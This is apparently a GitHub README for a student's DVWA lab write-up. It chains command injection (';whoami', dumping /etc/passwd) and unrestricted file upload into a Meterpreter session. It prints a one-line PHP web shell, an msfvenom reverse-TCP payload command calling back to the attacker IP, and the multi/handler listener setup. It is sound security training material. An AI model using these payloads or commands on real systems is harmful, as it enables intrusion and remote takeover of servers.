# DVWA-Penetration-Testing-Lab-
Hands-on web application penetration testing lab using Kali Linux, Metasploit and msfvenom. Practised command injection, unrestricted file upload, web shells and Meterpreter reverse shells in a controlled environment.



# DVWA Exploitation Lab (Command Injection, Unrestricted File Upload, and Metasploit Reverse Shell)

`DVWA` · `Kali Linux` · `Metasploit` · `msfvenom` · `Command Injection` · `Unrestricted File Upload` · `Meterpreter`

## Overview
This lab was hands-on practice chaining together two classic OWASP-style web vulnerabilities in DVWA (Damn Vulnerable Web Application) — **Command Injection** and **Unrestricted File Upload** — and then using that access to get a full **Meterpreter session** on the target via Metasploit. The goal was to go beyond just proving a vulnerability exists and actually walk the full attack chain: enumerate the filesystem, drop a web shell, upgrade that web shell into a proper reverse shell payload generated with `msfvenom`, and catch the callback with `multi/handler`.

## Objective
Practice exploiting command injection and file upload vulnerabilities on a purposely vulnerable web app, and use that initial foothold to deliver and catch a Metasploit payload for full interactive access to the target.

## Environment
- **Attacker box:** Kali Linux (VM, root shell), attacker IP `10.1.16.66`
- **Target:** DVWA instance at `dvwa.structureality.com`, running as `www-data` on a LAMP stack (user `lamp`), reachable at `172.16.0.201` on `eth0` and `172.20.245.84` on `eth2`
- **Lab platform:** CompTIA Learning Platform, hosted lab environment via LabClient (labondemand.com)

## Tools I Used

| Tool | What It Does | Why I Used It |
|------|--------------|----------------|
| **DVWA** | Deliberately vulnerable web app | Target application for both the Command Injection and File Upload modules |
| **msfvenom** | Payload generator | Generated a raw PHP Meterpreter reverse TCP payload (`shell.php`) to upload through the vulnerable upload form |
| **Metasploit (`multi/handler`)** | Listener/handler | Caught the reverse connection from the uploaded payload and opened an interactive Meterpreter session |
| **Firefox (Kali)** | Browser | Interacted with DVWA's Command Injection and File Upload forms, and browsed directly to uploaded files |
| **GNOME file chooser / terminal** | File management | Verified uploaded payload files (`shell.php`, `special.php`, `world.png`) and their sizes before/after upload |

## What I Did

### Part 1: Command Injection
1. Opened DVWA's **Command Injection** module (`Ping a device` form) and submitted a normal loopback ping (`127.0.01`) to confirm the form executes a real system ping and returns raw output in the page.
2. Chained additional commands onto the ping using `;` as a separator, escalating from simple enumeration to full system recon:
   - `127.0.01; ls -la` — listed the current working directory
   - `; whoami; hostname; ip a; pwd; uptime` — pulled the running user, hostname, network interfaces, current working directory, and uptime in one submission
3. Confirmed the web server was running as **`www-data`**, hostname **`lamp`**, with `eth0` on `172.16.0.201/24` and `eth2` on `172.20.245.84/16`, working directory `/var/www/dvwa.structureality.com/public_html/vulnerabilities/exec`, and an uptime of about 14 minutes.
4. Escalated further and dumped `/etc/passwd` through the same injection point, confirming full local account enumeration was possible from an unauthenticated-feeling web form (in reality logged-in low-privilege web app context).
5. Also used the injection point to list the DVWA application's own directory structure (`authbypass`, `brute`, `captcha`, `csp`, `csrf`, `exec`, `fi`, `sqli`, `upload`, `vulnerabilities`, etc.), which is useful for mapping out the rest of the target application before moving to the next module.

### Part 2: Unrestricted File Upload → Web Shell
1. Switched to DVWA's **File Upload** module.
2. First attempted to upload an image (`world.png`, sourced from `/usr/share/xsser/gtk/images/world.png` and copied into the working directory), which uploaded successfully to `../../hackable/uploads/world.png`, confirming the upload path and that basic uploads worked.
3. Created a minimal PHP web shell (`special.php`) containing:
   ```php
   <?php system($_REQUEST["cmd"]); ?>
   ```
4. Uploaded `special.php` through the same form. It was accepted with no file-type validation and confirmed at `../../hackable/uploads/special.php succesfully uploaded!` — proving the upload form does not restrict file extensions, only (loosely) validates it thinks it's receiving an image.
5. Verified locally in the file browser that both `shell.php` (34.8 kB) and `special.php` (36 bytes) existed alongside the legitimate `world.png` (90.8 kB), confirming the payload files were correctly staged before upload.
6. Noted one failed upload attempt along the way ("Your image was not uploaded.") — a reminder that not every upload attempt succeeds on the first try, and confirming the app *does* reject some submissions rather than accepting literally anything blindly.

### Part 3: Generating and Catching a Reverse Shell with Metasploit
1. Generated a raw PHP Meterpreter reverse TCP payload with `msfvenom`:
   ```bash
   msfvenom -p php/meterpreter_reverse_tcp LHOST=10.1.16.66 LPORT=9999 -f raw > shell.php
   ```
   Output confirmed: PHP platform/arch auto-selected, no encoder used (raw payload), final payload size **34,849 bytes**.
2. Uploaded the resulting `shell.php` through the same File Upload vulnerability, confirmed at `../../hackable/uploads/shell.php succesfully uploaded!`.
3. Set up a Metasploit listener to catch the callback:
   ```bash
   msf6 > use exploit/multi/handler
   msf6 exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
   msf6 exploit(multi/handler) > set Lhost 10.1.16.66
   msf6 exploit(multi/handler) > set LPORT 9999
   msf6 exploit(multi/handler) > show options
   msf6 exploit(multi/handler) > run
   ```
   Confirmed via `show options` that `LHOST=10.1.16.66` and `LPORT=9999` were correctly set before running.
4. Started the reverse TCP handler (`Started reverse TCP handler on 10.1.16.66:9999`), then triggered the uploaded `shell.php` by browsing to it directly in the target's uploads directory.
5. Caught the callback: **`Meterpreter session 1 opened (10.1.16.66:9999 → 172.16.0.201:48358)`**, confirming full interactive access to the target through the uploaded payload.
6. Explored available Meterpreter modules from the interactive session, including:
   - **Stdapi: Networking Commands** — `portfwd`, `resolve`
   - **Stdapi: System Commands** — `execute`, `getenv`, `getpid`, `getuid`, `kill`, `pgrep`, `pkill`, `ps`, `shell`, `sysinfo`
   - **Stdapi: Audio Output Commands** — `play`
7. Cleanly exited the session with `exit`, confirming Metasploit's graceful shutdown (`Shutting down Meterpreter... Meterpreter session 1 closed. Reason: User exit`) rather than leaving the handler in a broken state.

## What's in This Repo
```
dvwa-exploitation-lab/
├── README.md                          # This file
├── payloads/
│   ├── special.php                    # Minimal system() web shell
│   └── shell.php                      # msfvenom-generated Meterpreter reverse TCP payload
└── screenshots/
    ├── 01-command-injection-basic-ping.png
    ├── 02-command-injection-chained-commands.png
    ├── 03-command-injection-etc-passwd.png
    ├── 04-command-injection-dvwa-dir-listing.png
    ├── 05-file-upload-image-success.png
    ├── 06-file-upload-webshell-success.png
    ├── 07-msfvenom-payload-generation.png
    ├── 08-metasploit-handler-setup.png
    ├── 09-meterpreter-session-opened.png
    └── 10-meterpreter-command-reference.png
```

## Skills I Picked Up
- **Command injection via metacharacters,** using `;` to chain arbitrary shell commands onto a legitimate-looking ping function, and reading raw command output returned directly in a web page.
- **Recognizing unrestricted file upload as an RCE primitive,** not just a "wrong file type accepted" bug — the moment an attacker can upload and reach an executable server-side script, file upload becomes remote code execution.
- **Writing a minimal PHP web shell** (`system($_REQUEST["cmd"])`) to prove code execution before escalating to a full payload.
- **Generating platform-specific payloads with `msfvenom`,** understanding the difference between a raw payload format meant to be dropped as a file (`-f raw`) versus other encoded/executable formats.
- **Setting up and running `exploit/multi/handler`** as a generic listener that matches whatever payload type was actually delivered (in this case `php/meterpreter_reverse_tcp`), rather than relying on a specific exploit module.
- **Reading Meterpreter's built-in help/module listing** to understand what post-exploitation capability a session actually grants (networking, system, even audio commands) rather than assuming what's available.

## How This Applies in the Real World
This lab mirrors a very realistic attack chain against a poorly secured internal or legacy web application: an unauthenticated or low-privilege input field with no command sanitization gives an attacker enough recon to understand the target, and a file upload form with no extension or content-type validation gives them a direct path to code execution. Chaining the two — using command injection for recon, and file upload for actual payload delivery — is a pattern that shows up constantly in real penetration tests and in the wild against vulnerable CMS platforms, admin panels, and internal tools.

The move from a one-line PHP web shell to a full `msfvenom`-generated Meterpreter payload also reflects a realistic escalation path: prove code execution cheaply and quietly first, then bring in a fuller-featured payload once initial access is confirmed.

## Where I'm Coming From
I'm making the jump into cybersecurity from a background in **healthcare**. I'm currently studying for **CompTIA Security+** and building labs like this one to get real hands-on reps with offensive techniques, since that's the area I'm most focused on building up right now.

## What I Want to Learn Next
- Automating this same chain with Metasploit's `exploit/unix/webapp/dvwa_exec_immune` or a similar module instead of manual command injection
- Practicing payload obfuscation/encoding to understand detection evasion at a conceptual level (for defensive awareness, not for real-world evasion)
- Moving from a web shell to persistence techniques and privilege escalation once inside
- Practicing the same attack chain against a target with basic WAF or upload filtering in place, to see what actually stops this kind of attack

## Limitations & What I'd Do Differently in Production
- **DVWA is intentionally vulnerable at low security settings.** None of this reflects a hardened production application — no input sanitization, no file-type validation, and no WAF in front of the app.
- **No cleanup step was documented here beyond exiting the Meterpreter session.** In a real engagement, uploaded web shells and payload files would need to be tracked and removed as part of a clean handoff.
- **This was a single, uncontested target with no logging/alerting review.** A real assessment would also check whether the injection and upload activity was logged or would have triggered any detection.
- **No privilege escalation was attempted from the `www-data` shell.** This lab stopped at "gained a shell as the web server user," not at "gained root."

## References
- [OWASP: Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [OWASP: Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [Metasploit Documentation](https://docs.metasploit.com/)
- [CompTIA Security+ (SY0-701) Exam Objectives](https://www.comptia.org/certifications/security)
- DVWA (Damn Vulnerable Web Application), target environment used throughout

Give a description on this to put on GitHub
